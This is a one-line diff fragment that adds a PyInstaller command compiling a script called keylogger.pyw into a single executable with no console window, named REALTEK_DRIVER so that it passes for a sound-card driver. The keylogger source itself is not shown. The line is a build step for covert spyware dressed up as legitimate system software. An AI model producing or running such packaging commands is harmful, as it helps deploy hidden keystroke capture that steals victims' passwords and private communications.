@@ -1,0 +1,1 @@
+pyinstaller keylogger.pyw --onefile --name REALTEK_DRIVER --noconsole
